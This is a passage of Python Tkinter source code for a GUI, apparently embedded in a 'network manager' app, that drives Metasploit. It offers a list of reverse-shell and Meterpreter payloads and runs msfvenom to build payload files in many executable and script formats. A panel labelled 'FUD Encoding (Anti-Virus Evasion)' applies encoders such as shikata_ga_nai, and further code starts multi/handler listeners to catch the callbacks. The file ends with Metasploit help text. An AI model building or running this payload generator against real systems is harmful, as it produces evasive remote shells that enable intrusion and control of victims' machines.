            "python/shell_reverse_tcp",
            # Java
            "java/meterpreter/reverse_tcp",
            "java/meterpreter/reverse_http",
            "java/shell/reverse_tcp",
            # PowerShell
            "windows/powershell/meterpreter/reverse_tcp",
            "windows/powershell/meterpreter/reverse_http",
            "windows/powershell/meterpreter/reverse_https",
            "windows/powershell/shell_reverse_tcp",
            # CMD
            "windows/powershell/powershell_reverse_tcp",
            "cmd/windows/powershell_reverse_tcp",
            # Node.js
            "nodejs/shell_reverse_tcp",
            "nodejs/shell_bind_tcp",
            # Ruby
            "ruby/shell_reverse_tcp",
            "ruby/shell_bind_tcp",
            # Bash
            "cmd/unix/reverse_bash",
            "cmd/unix/reverse_bash_tcp",
            # Telnet
            "cmd/unix/reverse",
            "cmd/unix/bind",
        ]
        
        payload_type_combo = ttk.Combobox(payload_type_frame, textvariable=self.metasploit_payload_type,
                                         values=payload_list,
                                         width=30, font=("Consolas", 8))
        payload_type_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # LHOST and LPORT in one row
        hostport_frame = ttk.Frame(payload_frame)
        hostport_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(hostport_frame, text="LHOST:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_lhost_var = tk.StringVar()
        lhost_entry = ttk.Entry(hostport_frame, textvariable=self.metasploit_lhost_var,
                               font=("Consolas", 8), width=15)
        lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        # Auto-detect local IP
        try:
            import socket
            local_ip = socket.gethostbyname(socket.gethostname())
            if local_ip and local_ip != '127.0.0.1':
                self.metasploit_lhost_var.set(local_ip)
        except:
            pass
        
        ttk.Label(hostport_frame, text="LPORT:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_lport_var = tk.StringVar(value="4444")
        lport_entry = ttk.Entry(hostport_frame, textvariable=self.metasploit_lport_var,
                               font=("Consolas", 8), width=8)
        lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Format and Output directory in one row
        format_dir_frame = ttk.Frame(payload_frame)
        format_dir_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(format_dir_frame, text="Format:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_format_var = tk.StringVar(value="exe")
        format_combo = ttk.Combobox(format_dir_frame, textvariable=self.metasploit_format_var,
                                   values=["exe", "raw", "elf", "python", "ps1", "sh", "bash", "perl", 
                                          "ruby", "lua", "java", "war", "jsp", "asp", "aspx", "dll",
                                          "so", "deb", "rpm", "apk", "jar", "a", "macho", "msi",
                                          "vbs", "js", "hta", "cpl", "dylib", "bin", "hex", "base64"],
                                   width=8, font=("Consolas", 8))
        format_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        ttk.Label(format_dir_frame, text="Dir:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_output_dir = tk.StringVar(value=os.path.expanduser("~"))
        output_dir_entry = ttk.Entry(format_dir_frame, textvariable=self.metasploit_output_dir,
                                     font=("Consolas", 8), width=12)
        output_dir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
        
        browse_dir_btn = ttk.Button(format_dir_frame, text="...",
                                    command=self.browse_payload_directory)
        browse_dir_btn.pack(side=tk.LEFT)
        
        # Output file
        output_frame = ttk.Frame(payload_frame)
        output_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(output_frame, text="Filename:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_output_var = tk.StringVar(value="payload")
        output_entry = ttk.Entry(output_frame, textvariable=self.metasploit_output_var,
                                font=("Consolas", 8))
        output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # FUD Encoding options
        fud_frame = ttk.LabelFrame(payload_frame, text="FUD Encoding (Anti-Virus Evasion)", padding="3")
        fud_frame.pack(fill=tk.X, pady=(3, 0))
        
        encoder_frame = ttk.Frame(fud_frame)
        encoder_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(encoder_frame, text="Encoder:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_encoder_var = tk.StringVar(value="None")
        encoder_combo = ttk.Combobox(encoder_frame, textvariable=self.metasploit_encoder_var,
                                    values=["None", "x86/shikata_ga_nai", "x86/call4_dword_xor", 
                                           "x86/countdown", "x86/fnstenv_mov", "x86/jmp_call_additive",
                                           "x86/nonalpha", "x86/opt_sub", "x86/unicode_mixed",
                                           "x86/unicode_upper", "x64/xor", "x64/xor_dynamic",
                                           "x64/zutto_dekiru", "cmd/powershell_base64"],
                                    width=20, font=("Consolas", 8), state="readonly")
        encoder_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        ttk.Label(encoder_frame, text="Iterations:", font=("Segoe UI", 8)).pack(side=tk.LEFT, padx=(0, 3))
        self.metasploit_iterations_var = tk.StringVar(value="1")
        iterations_entry = ttk.Entry(encoder_frame, textvariable=self.metasploit_iterations_var,
                                     font=("Consolas", 8), width=5)
        iterations_entry.pack(side=tk.LEFT)
        
        # Generate and Handler buttons in one row
        btn_frame = ttk.Frame(payload_frame)
        btn_frame.pack(fill=tk.X, pady=(3, 0))
        
        generate_btn = ttk.Button(btn_frame, text="Generate",
                                 command=self.generate_metasploit_payload,
                                 state="normal" if has_metasploit else "disabled")
        generate_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 3))
        
        handler_btn = ttk.Button(btn_frame, text="Setup Handler",
                                command=self.setup_metasploit_handler,
                                state="normal" if has_metasploit else "disabled")
        handler_btn.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Quick Commands - more compact
        quick_cmds_frame = ttk.LabelFrame(right_frame, text="Quick Commands", padding="5")
        quick_cmds_frame.pack(fill=tk.X)
        
        quick_btn_frame = ttk.Frame(quick_cmds_frame)
        quick_btn_frame.pack(fill=tk.X)
        
        # Common commands
        common_commands = [
            ("Sessions", "sessions", None),
            ("Jobs", "jobs", None),
            ("Info", "info", self.show_info_dialog),
            ("Show Options", "show options", None),
            ("Show Payloads", "show payloads", None),
            ("Back", "back", None),
            ("Exit", "exit", None),
        ]
        
        for i, (label, cmd, handler) in enumerate(common_commands):
            if handler:
                btn = ttk.Button(quick_btn_frame, text=label, width=10,
                               command=handler,
                               state="normal" if has_metasploit else "disabled")
            else:
                btn = ttk.Button(quick_btn_frame, text=label, width=10,
                               command=lambda c=cmd: self.execute_quick_command(c),
                               state="normal" if has_metasploit else "disabled")
            btn.grid(row=i // 4, column=i % 4, padx=1, pady=1, sticky=(tk.W, tk.E))
        
        quick_btn_frame.columnconfigure(0, weight=1)
        quick_btn_frame.columnconfigure(1, weight=1)
        quick_btn_frame.columnconfigure(2, weight=1)
        quick_btn_frame.columnconfigure(3, weight=1)
        
        # Metasploit process tracking
        self.metasploit_process = None
        self.metasploit_sudo_password = None
        self.metasploit_modules_loaded = False
        self.metasploit_selected_module = None
    
    # Note: Commands execute directly via msfconsole -q -x without needing a persistent process
    # This is more efficient and doesn't require Start/Stop buttons
    
    def execute_metasploit_command(self):
        """Execute a Metasploit command."""
        cmd = self.metasploit_cmd_var.get().strip()
        if not cmd:
            return
        
        self.append_metasploit_output(f"> {cmd}\n")
        self.metasploit_cmd_var.set("")
        
        # Check if command needs root
        needs_root = any(keyword in cmd.lower() for keyword in [
            'exploit', 'use exploit', 'run', 'execute'
        ])
        
        if needs_root and not self.metasploit_sudo_password:
            password = self.request_sudo_password()
            if password:
                self.metasploit_sudo_password = password
            else:
                self.append_metasploit_output("Command cancelled (root password required).\n")
                return
        
        # Execute command directly via msfconsole (no persistent process needed)
        try:
            if 'search' in cmd.lower():
                # Handle search command
                search_term = cmd.replace('search', '').strip()
                result = subprocess.run(['msfconsole', '-q', '-x', f'search {search_term}; exit'],
                                      capture_output=True, text=True, timeout=30)
                self.append_metasploit_output(result.stdout)
                if result.stderr:
                    self.append_metasploit_output(f"Error: {result.stderr}\n")
            else:
                # Generic command execution
                result = subprocess.run(['msfconsole', '-q', '-x', f'{cmd}; exit'],
                                      capture_output=True, text=True, timeout=30)
                self.append_metasploit_output(result.stdout)
                if result.stderr:
                    self.append_metasploit_output(f"Error: {result.stderr}\n")
        except subprocess.TimeoutExpired:
            self.append_metasploit_output("Command timed out.\n")
        except Exception as e:
            self.append_metasploit_output(f"Error executing command: {str(e)}\n")
    
    def search_metasploit_modules(self):
        """Search for Metasploit modules."""
        search_term = self.metasploit_search_var.get().strip()
        if not search_term:
            messagebox.showwarning("Search", "Please enter a search term.")
            return
        
        self.append_metasploit_output(f"Searching for: {search_term}\n")
        try:
            result = subprocess.run(['msfconsole', '-q', '-x', f'search {search_term}; exit'],
                                  capture_output=True, text=True, timeout=30)
            self.append_metasploit_output(result.stdout)
            if result.stderr:
                self.append_metasploit_output(f"Error: {result.stderr}\n")
        except subprocess.TimeoutExpired:
            self.append_metasploit_output("Search timed out.\n")
        except Exception as e:
            self.append_metasploit_output(f"Error: {str(e)}\n")
    
    def generate_metasploit_payload(self):
        """Generate a Metasploit payload using msfvenom."""
        payload_type = self.metasploit_payload_type.get()
        lhost = self.metasploit_lhost_var.get().strip()
        lport = self.metasploit_lport_var.get().strip()
        output_format = self.metasploit_format_var.get()
        output_file = self.metasploit_output_var.get().strip()
        
        if not lhost:
            messagebox.showwarning("Payload", "Please enter LHOST (your IP address).")
            return
        
        if not lport:
            messagebox.showwarning("Payload", "Please enter LPORT.")
            return
        
        if not output_file:
            messagebox.showwarning("Payload", "Please enter output filename.")
            return
        
        # Get output directory
        output_dir = self.metasploit_output_dir.get().strip()
        if not output_dir:
            output_dir = os.path.expanduser("~")
        
        # Ensure directory exists
        try:
            os.makedirs(output_dir, exist_ok=True)
        except Exception as e:
            messagebox.showerror("Error", f"Cannot create output directory: {str(e)}")
            return
        
        # Build full output path
        output_path = os.path.join(output_dir, f"{output_file}.{output_format}")
        
        # Get FUD encoding options
        encoder = self.metasploit_encoder_var.get()
        iterations = self.metasploit_iterations_var.get().strip()
        
        # Build msfvenom command
        cmd = ['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', f'-f', output_format]
        
        # Add encoder if selected
        if encoder and encoder != "None":
            try:
                iterations_int = int(iterations) if iterations else 1
                if iterations_int < 1:
                    iterations_int = 1
                elif iterations_int > 10:
                    iterations_int = 10  # Limit to prevent excessive encoding
                cmd.extend(['-e', encoder, '-i', str(iterations_int)])
            except ValueError:
                cmd.extend(['-e', encoder, '-i', '1'])
        
        cmd.extend(['-o', output_path])
        
        self.append_metasploit_output(f"Generating payload: {payload_type}\n")
        if encoder and encoder != "None":
            self.append_metasploit_output(f"Encoder: {encoder} (iterations: {iterations})\n")
        self.append_metasploit_output(f"Command: {' '.join(cmd)}\n")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                self.append_metasploit_output(f"Payload generated successfully: {output_path}\n")
                self.append_metasploit_output(result.stdout)
            else:
                self.append_metasploit_output(f"Error generating payload:\n{result.stderr}\n")
                messagebox.showerror("Error", f"Failed to generate payload:\n{result.stderr}")
        except subprocess.TimeoutExpired:
            self.append_metasploit_output("Payload generation timed out.\n")
            messagebox.showerror("Timeout", "Payload generation timed out.")
        except Exception as e:
            self.append_metasploit_output(f"Error: {str(e)}\n")
            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")
    
    def load_metasploit_modules(self):
        """Load all Metasploit modules into the list."""
        self.append_metasploit_output("Loading Metasploit modules... This may take a moment.\n")
        self.metasploit_modules_list.delete(0, tk.END)
        self.metasploit_all_modules = []
        
        # Disable load button while loading
        if hasattr(self, 'load_modules_btn'):
            self.load_modules_btn.config(state="disabled")
        
        def load_in_thread():
            """Load modules in background thread."""
            modules = []
            
            try:
                # Use search command which outputs cleaner module lists
                self.root.after(0, lambda: self.append_metasploit_output("Searching for modules...\n"))
                
                # Search for all module types
                search_commands = [
                    'search type:exploit',
                    'search type:auxiliary', 
                    'search type:payload',
                    'search type:post',
                    'search type:encoder',
                    'search type:nop'
                ]
                
                for search_cmd in search_commands:
                    try:
                        result = subprocess.run(['msfconsole', '-q', '-x', f'{search_cmd}; exit'],
                                              capture_output=True, text=True, timeout=45)
                        
                        # Parse search results - format is cleaner
                        for line in result.stdout.split('\n'):
                            line = line.strip()
                            if not line or line.startswith('=') or 'Matching' in line or '====' in line:
                                continue
                            
                            # Search output format: "exploit/path/to/module    description..."
                            # Or: "   exploit/path/to/module"
                            parts = line.split()
                            for part in parts:
                                # Look for module paths
                                if '/' in part and (
                                    part.startswith('exploit/') or
                                    part.startswith('auxiliary/') or
                                    part.startswith('payload/') or
                                    part.startswith('post/') or
                                    part.startswith('encoder/') or
                                    part.startswith('nop/')
                                ):
                                    # Clean up any trailing punctuation
                                    module = part.rstrip('.,;:')
                                    if module not in modules:
                                        modules.append(module)
                                    break
                    except subprocess.TimeoutExpired:
                        self.root.after(0, lambda: self.append_metasploit_output(f"Timeout on {search_cmd}\n"))
                    except Exception as e:
                        self.root.after(0, lambda e=str(e), s=search_cmd: self.append_metasploit_output(f"Error on {s}: {e}\n"))
                
                # If we didn't get many modules, try alternative method using show commands
                if len(modules) < 50:
                    self.root.after(0, lambda: self.append_metasploit_output("Trying alternative method (show commands)...\n"))
                    # Try show commands with better parsing
                    module_types = ['exploits', 'auxiliary', 'payloads', 'post', 'encoders', 'nops']
                    for mod_type in module_types:
                        try:
                            result = subprocess.run(['msfconsole', '-q', '-x', f'show {mod_type}; exit'],
                                                  capture_output=True, text=True, timeout=20)
                            # Parse table format - look for lines with module paths
                            for line in result.stdout.split('\n'):
                                line = line.strip()
                                if not line or '===' in line or '---' in line or 'Name' in line and 'Disclosure' in line:
                                    continue
                                # Look for module path pattern in the line
                                # Match patterns like "exploit/..." or "auxiliary/..." etc
                                matches = re.findall(r'\b(exploit|auxiliary|payload|post|encoder|nop)/[^\s]+', line)
                                for match in matches:
                                    if match not in modules:
                                        modules.append(match)
                        except:
                            pass
                
                # Fallback to msfvenom payloads if still empty
                if not modules:
                    self.root.after(0, lambda: self.append_metasploit_output("Loading payloads from msfvenom...\n"))
                    try:
                        result = subprocess.run(['msfvenom', '--list', 'payloads'],
                                              capture_output=True, text=True, timeout=30)
                        for line in result.stdout.split('\n'):
                            line = line.strip()
                            if line and '/' in line and not line.startswith(' ') and not line.startswith('Name'):
                                parts = line.split()
                                if parts:
                                    module = parts[0]
                                    if module.startswith('payload/'):
                                        modules.append(module.replace('payload/', 'payload/'))
                                    elif '/' in module:
                                        modules.append(module)
                    except Exception as e:
                        self.root.after(0, lambda e=str(e): self.append_metasploit_output(f"Error: {e}\n"))
                
                # Store and display modules
                unique_modules = sorted(set(modules))
                self.metasploit_all_modules = unique_modules
                
                # Update UI in main thread
                def update_ui():
                    # Clear list first
                    self.metasploit_modules_list.delete(0, tk.END)
                    # Add all modules
                    for module in unique_modules:
                        self.metasploit_modules_list.insert(tk.END, module)
                    self.metasploit_modules_loaded = True
                    self.append_metasploit_output(f"✓ Loaded {len(unique_modules)} modules successfully!\n")
                    self.append_metasploit_output("Modules are now available in the list above.\n")
                    self.append_metasploit_output("Use the filter to search for specific modules.\n")
                    if hasattr(self, 'load_modules_btn'):
                        self.load_modules_btn.config(state="normal")
                    # Refresh filter to show all modules
                    if hasattr(self, 'metasploit_module_filter'):
                        self.filter_metasploit_modules(None)
                
                self.root.after(0, update_ui)
                
            except Exception as e:
                def show_error():
                    self.append_metasploit_output(f"Error loading modules: {str(e)}\n")
                    self.append_metasploit_output("You can use the 'search' command in the console instead.\n")
                    if hasattr(self, 'load_modules_btn'):
                        self.load_modules_btn.config(state="normal")
                self.root.after(0, show_error)
        
        # Load in background thread
        threading.Thread(target=load_in_thread, daemon=True).start()
    
    def browse_payload_directory(self):
        """Browse for payload output directory."""
        directory = filedialog.askdirectory(
            initialdir=self.metasploit_output_dir.get(),
            title="Select Payload Output Directory"
        )
        if directory:
            self.metasploit_output_dir.set(directory)
    
    def select_metasploit_module(self, event):
        """Select a module from the list (single click)."""
        selection = self.metasploit_modules_list.curselection()
        if selection:
            module = self.metasploit_modules_list.get(selection[0])
            self.metasploit_selected_module = module
            self.use_module_btn.config(state="normal")
            # Show module info in console
            self.append_metasploit_output(f"Selected: {module}\n")
    
    def use_selected_metasploit_module(self):
        """Use the currently selected module."""
        if self.metasploit_selected_module:
            self.use_metasploit_module_direct(self.metasploit_selected_module)
    
    def use_metasploit_module(self, event):
        """Use a module from the list (double-click)."""
        selection = self.metasploit_modules_list.curselection()
        if selection:
            module = self.metasploit_modules_list.get(selection[0])
            self.use_metasploit_module_direct(module)
    
    def use_metasploit_module_direct(self, module):
        """Use a module directly."""
        # Insert 'use' command
        self.metasploit_cmd_var.set(f"use {module}")
        self.append_metasploit_output(f"Using module: {module}\n")
        # Execute the command
        self.execute_metasploit_command()
        # Focus on command entry
        self.root.after(100, lambda: self.root.focus_set())
    
    def filter_metasploit_modules(self, event):
        """Filter modules based on search text and type."""
        if not hasattr(self, 'metasploit_all_modules') or not self.metasploit_all_modules:
            return
        
        filter_text = self.metasploit_module_filter.get().lower() if hasattr(self, 'metasploit_module_filter') else ""
        filter_type = self.metasploit_module_type.get().lower() if hasattr(self, 'metasploit_module_type') else "all"
        
        # Clear current list
        self.metasploit_modules_list.delete(0, tk.END)
        
        # Filter modules
        filtered = []
        for module in self.metasploit_all_modules:
            # Type filter
            if filter_type != "all":
                # Handle plural forms
                type_prefix = filter_type.rstrip('s') + "/"
                if not module.startswith(type_prefix):
                    continue
            
            # Text filter
            if filter_text and filter_text not in module.lower():
                continue
            
            filtered.append(module)
        
        # Add filtered modules
        for module in filtered:
            self.metasploit_modules_list.insert(tk.END, module)
        
        # Update status in console (only if filtering)
        if (filter_text or filter_type != "all") and len(filtered) != len(self.metasploit_all_modules):
            self.append_metasploit_output(f"Showing {len(filtered)} of {len(self.metasploit_all_modules)} modules\n")
    
    def setup_metasploit_handler(self):
        """Setup a Metasploit handler for the generated payload."""
        payload_type = self.metasploit_payload_type.get()
        lhost = self.metasploit_lhost_var.get().strip()
        lport = self.metasploit_lport_var.get().strip()
        
        if not lhost:
            messagebox.showwarning("Handler", "Please enter LHOST (your IP address).")
            return
        
        if not lport:
            messagebox.showwarning("Handler", "Please enter LPORT.")
            return
        
        # Determine handler type based on payload
        if 'http' in payload_type or 'https' in payload_type:
            handler_cmd = f"use exploit/multi/handler\nset payload {payload_type}\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j"
        else:
            handler_cmd = f"use exploit/multi/handler\nset payload {payload_type}\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j"
        
        self.append_metasploit_output(f"Setting up handler for {payload_type}...\n")
        self.append_metasploit_output(f"Handler command:\n{handler_cmd}\n")
        
        # Execute handler setup
        try:
            result = subprocess.run(['msfconsole', '-q', '-x', handler_cmd + '; exit'],
                                  capture_output=True, text=True, timeout=30)
            self.append_metasploit_output(result.stdout)
            if result.stderr:
                self.append_metasploit_output(f"Error: {result.stderr}\n")
            else:
                self.append_metasploit_output("Handler started in background (use 'jobs' to see it).\n")
        except subprocess.TimeoutExpired:
            self.append_metasploit_output("Handler setup timed out.\n")
        except Exception as e:
            self.append_metasploit_output(f"Error: {str(e)}\n")
    
    def show_info_dialog(self):
        """Show dialog to input module name(s) for info command."""
        dialog = tk.Toplevel(self.root)
        dialog.title("Metasploit Info Command")
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Center dialog on same monitor as main window
        dialog.update_idletasks()
        main_x = self.root.winfo_x()
        main_y = self.root.winfo_y()
        main_width = self.root.winfo_width()
        main_height = self.root.winfo_height()
        
        dialog_width = 500
        dialog_height = 200
        dialog_x = main_x + (main_width // 2) - (dialog_width // 2)
        dialog_y = main_y + (main_height // 2) - (dialog_height // 2)
        
        # Ensure dialog stays on screen
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        dialog_x = max(0, min(dialog_x, screen_width - dialog_width))
        dialog_y = max(0, min(dialog_y, screen_height - dialog_height))
        
        dialog.geometry(f"{dialog_width}x{dialog_height}+{dialog_x}+{dialog_y}")
        
        # Content
        content_frame = ttk.Frame(dialog, padding="10")
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(content_frame, text="Module Name(s):", font=("Segoe UI", 9)).pack(anchor=tk.W, pady=(0, 5))
        ttk.Label(content_frame, 
                 text="Enter one or more module names (space-separated)\nExample: exploit/windows/smb/ms17_010_eternalblue",
                 font=("Segoe UI", 8), foreground="#666666").pack(anchor=tk.W, pady=(0, 10))
        
        module_var = tk.StringVar()
        module_entry = ttk.Entry(content_frame, textvariable=module_var, font=("Consolas", 9), width=60)
        module_entry.pack(fill=tk.X, pady=(0, 10))
        module_entry.focus()
        
        # Options
        options_frame = ttk.Frame(content_frame)
        options_frame.pack(fill=tk.X, pady=(0, 10))
        
        json_var = tk.BooleanVar()
        json_check = ttk.Checkbutton(options_frame, text="JSON format (-j)", variable=json_var)
        json_check.pack(side=tk.LEFT, padx=(0, 10))
        
        markdown_var = tk.BooleanVar()
        markdown_check = ttk.Checkbutton(options_frame, text="Markdown/Browser (-d)", variable=markdown_var)
        markdown_check.pack(side=tk.LEFT)
        
        # Buttons
        btn_frame = ttk.Frame(content_frame)
        btn_frame.pack(fill=tk.X)
        
        def execute_info():
            module_names = module_var.get().strip()
            if not module_names:
                messagebox.showwarning("Info", "Please enter at least one module name.")
                return
            
            # Build info command
            info_cmd = "info"
            if json_var.get():
                info_cmd += " -j"
            if markdown_var.get():
                info_cmd += " -d"
            info_cmd += f" {module_names}"
            
            dialog.destroy()
            self.append_metasploit_output(f"> {info_cmd}\n")
            
            # Execute info command
            try:
                result = subprocess.run(['msfconsole', '-q', '-x', f'{info_cmd}; exit'],
                                      capture_output=True, text=True, timeout=45)
                self.append_metasploit_output(result.stdout)
                if result.stderr:
                    self.append_metasploit_output(f"Error: {result.stderr}\n")
            except subprocess.TimeoutExpired:
                self.append_metasploit_output("Info command timed out.\n")
            except Exception as e:
                self.append_metasploit_output(f"Error: {str(e)}\n")
        
        ttk.Button(btn_frame, text="Execute", command=execute_info).pack(side=tk.RIGHT, padx=(5, 0))
        ttk.Button(btn_frame, text="Cancel", command=dialog.destroy).pack(side=tk.RIGHT)
        
        # Bind Enter key
        module_entry.bind('<Return>', lambda e: execute_info())
        dialog.bind('<Escape>', lambda e: dialog.destroy())
    
    def execute_quick_command(self, command):
        """Execute a quick command."""
        self.metasploit_cmd_var.set(command)
        self.execute_metasploit_command()
    
    def create_metasploit_help_tab(self, parent):
        """Create the Metasploit Help tab with command reference."""
        # Create scrollable text widget for help content
        help_text = scrolledtext.ScrolledText(parent, 
                                             font=("Consolas", 9),
                                             bg="#ffffff",
                                             fg="#000000",
                                             wrap=tk.WORD,
                                             padx=10,
                                             pady=10)
        help_text.pack(fill=tk.BOTH, expand=True)
        
        # Help content
        help_content = """Core Commands
=============

Command           Description
-------           -----------
?                 Help menu
banner            Display an awesome metasploit banner
cd                Change the current working directory
color             Toggle color
connect           Communicate with a host
debug             Display information useful for debugging
exit              Exit the console
features          Display the list of not yet released features that can be opted in to
get               Gets the value of a context-specific variable
getg              Gets the value of a global variable
grep              Grep the output of another command
help              Help menu
history           Show command history
load              Load a framework plugin
quit              Exit the console
repeat            Repeat a list of commands
route             Route traffic through a session
save              Saves the active datastores
sessions          Dump session listings and display information about sessions
set               Sets a context-specific variable to a value
setg              Sets a global variable to a value
sleep             Do nothing for the specified number of seconds
spool             Write console output into a file as well the screen
threads           View and manipulate background threads
tips              Show a list of useful productivity tips
unload            Unload a framework plugin
unset             Unsets one or more context-specific variables
unsetg            Unsets one or more global variables
version           Show the framework and console library version numbers


Module Commands
===============

Command           Description
-------           -----------
advanced          Displays advanced options for one or more modules
back              Move back from the current context
clearm            Clear the module stack
favorite          Add module(s) to the list of favorite modules
favorites         Print the list of favorite modules (alias for `show favorites`)
info              Displays information about one or more modules
listm             List the module stack
loadpath          Searches for and loads modules from a path
options           Displays global options or for one or more modules
popm              Pops the latest module off the stack and makes it active
previous          Sets the previously loaded module as the current module
pushm             Pushes the active or list of modules onto the module stack
reload_all        Reloads all modules from all defined module paths
search            Searches module names and descriptions
show              Displays modules of a given type, or all modules
use               Interact with a module by name or search term/index


Job Commands
============

Command           Description
-------           -----------
handler           Start a payload handler as job
jobs              Displays and manages jobs
kill              Kill a job
rename_job        Rename a job


Resource Script Commands
========================

Command           Description
-------           -----------
makerc            Save commands entered since start to a file
resource          Run the commands stored in a file


Database Backend Commands
=========================

Command           Description
-------           -----------
analyze           Analyze database information about a specific address or address range
certs             List Pkcs12 certificate bundles in the database
db_connect        Connect to an existing data service
db_disconnect     Disconnect from the current data service
db_export         Export a file containing the contents of the database
db_import         Import a scan result file (filetype will be auto-detected)
db_nmap           Executes nmap and records the output automatically
db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
db_remove         Remove the saved data service entry
db_save           Save the current data service connection as the default to reconnect on startup
db_stats          Show statistics for the database
db_status         Show the current data service status
hosts             List all hosts in the database
klist             List Kerberos tickets in the database
loot              List all loot in the database
notes             List all notes in the database
services          List all services in the database
vulns             List all vulnerabilities in the database
workspace         Switch between database workspaces


Credentials Backend Commands
============================

Command           Description
-------           -----------
creds             List all credentials in the database


Developer Commands
==================

Command           Description
-------           -----------
edit              Edit the current module or a file with the preferred editor
irb               Open an interactive Ruby shell in the current context
log               Display framework.log paged to the end if possible
pry               Open the Pry debugger on the current module or Framework
reload_lib        Reload Ruby library files from specified paths
time              Time how long it takes to run a particular command


DNS Commands
============

Command           Description
-------           -----------
dns               Manage Metasploit's DNS resolving behaviour


For more info on a specific command, use <command> -h or help <command>.


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!


Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.


### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.


### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)


### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
"""
        
        # Insert help content
        help_text.insert(tk.END, help_content)
        
        # Make text read-only
        help_text.config(state=tk.DISABLED)
    
    def append_metasploit_output(self, text):
        """Append text to Metasploit console output."""
        self.metasploit_console.insert(tk.END, text)
        self.metasploit_console.see(tk.END)
        self.root.update_idletasks()


def main():
    """Main entry point - optimized for fast startup."""
    # Create root window immediately
    root = tk.Tk()
    
    # Initialize app (this loads everything)
    app = NetworkManagerGUI(root)
    
    # Start main loop
    root.mainloop()


if __name__ == "__main__":
    main()
